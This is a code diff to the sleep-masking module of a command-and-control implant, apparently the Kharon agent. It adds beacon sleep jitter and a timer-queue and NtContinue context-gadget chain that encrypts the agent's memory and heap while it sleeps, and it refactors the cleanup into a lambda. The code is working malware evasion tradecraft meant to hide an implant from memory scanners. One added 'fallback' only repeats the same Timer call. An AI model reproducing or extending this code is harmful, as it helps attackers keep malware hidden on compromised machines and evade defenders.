@@ -14,9 +14,10 @@ auto DECLFN Mask::Main(
     
     if ( Self->Config.Jitter ) {
         ULONG JitterMnt = ( Self->Config.Jitter * Self->Config.SleepTime ) / 100;
-        ULONG SleepMin = ( Self->Config.SleepTime > JitterMnt ? Self->Config.SleepTime - JitterMnt : 0 );
-        ULONG SleepMax = ( Self->Config.SleepTime + JitterMnt );
-        ULONG Range = ( SleepMax - SleepMin + 1 );
+        ULONG SleepMin  = ( Self->Config.SleepTime > JitterMnt ? Self->Config.SleepTime - JitterMnt : 0 );
+        ULONG SleepMax  = ( Self->Config.SleepTime + JitterMnt );
+        ULONG Range     = ( SleepMax - SleepMin + 1 );
+        
         RndTime = SleepMin + ( Rnd32() % Range );  
     } else {
         RndTime = Self->Config.SleepTime;
@@ -24,9 +25,17 @@ auto DECLFN Mask::Main(
 
     KhDbg( "sleep during: %d ms", RndTime );
 
-    switch( Self->Config.Mask.TechniqueID ) {
+    switch( Self->Config.Mask.Beacon ) {
     case eMask::Timer:
-        Success = this->Timer( RndTime ); break;
+        Success = this->Timer( RndTime );
+
+        if ( ! Success ) {
+            KhDbg( "standard wait failed, falling back to timer technique" );
+            Success = this->Timer( RndTime );
+        }
+
+        break;
+        
     case eMask::None:
         Success = this->Wait( RndTime ); break;
     }
@@ -62,6 +71,22 @@ auto DECLFN Mask::Timer(
     CONTEXT Ctx[10]  = { 0 };
     UINT16  ic       = 0;
 
+    auto CleanMask = [&]( VOID ) -> LONG {
+        if ( DupThreadHandle  ) Self->Ntdll.NtClose( DupThreadHandle );
+        if ( MainThreadHandle ) Self->Ntdll.NtClose( MainThreadHandle );
+        if ( Timer            ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
+        if ( Queue            ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
+        if ( EventEnd         ) Self->Ntdll.NtClose( EventEnd  );
+        if ( EventStart       ) Self->Ntdll.NtClose( EventStart );
+        if ( EventTimer       ) Self->Ntdll.NtClose( EventTimer  );
+
+        if ( ! NT_SUCCESS( NtStatus ) ) {
+            KhDbg( "memory obfuscation via timer failed: 0x%X", NtStatus );
+        }
+
+        return NT_SUCCESS( NtStatus );
+    };
+
     KhDbg( "kharon base at %p [0x%X bytes]", Self->Session.Base.Start, Self->Session.Base.Length );
     KhDbg( "running at thread id: %d thread id to duplicate: %d", Self->Session.ThreadID, DupThreadId );
     KhDbg( "NtContinue gadget at %p", Self->Config.Mask.NtContinueGadget );
@@ -76,16 +101,16 @@ auto DECLFN Mask::Timer(
     NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
 
     NtStatus = Self->Ntdll.RtlCreateTimerQueue( &Queue );
-    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
-    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
     
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
-    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL );
-    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;
 
@@ -174,24 +199,14 @@ auto DECLFN Mask::Timer(
     KhDbg( "trigger obf chain" );
 
     NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, nullptr );
-    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     if ( Self->Config.Mask.Heap ) {
         KhDbg( "deobfuscating heap allocations from agent" );
         Self->Hp->Crypt();
     }
 
-_KH_END:
-    if ( DupThreadHandle  ) Self->Ntdll.NtClose( DupThreadHandle );
-    if ( MainThreadHandle ) Self->Ntdll.NtClose( MainThreadHandle );
-    if ( Timer            ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
-    if ( Queue            ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
-    if ( EventEnd         ) Self->Ntdll.NtClose( EventEnd  );
-    if ( EventStart       ) Self->Ntdll.NtClose( EventStart );
-    if ( EventTimer       ) Self->Ntdll.NtClose( EventTimer  );
-
-    if ( NtStatus == STATUS_SUCCESS ) { return TRUE; } 
-    else { return FALSE; }
+    return CleanMask();
 }
 
 auto DECLFN Mask::Wait(
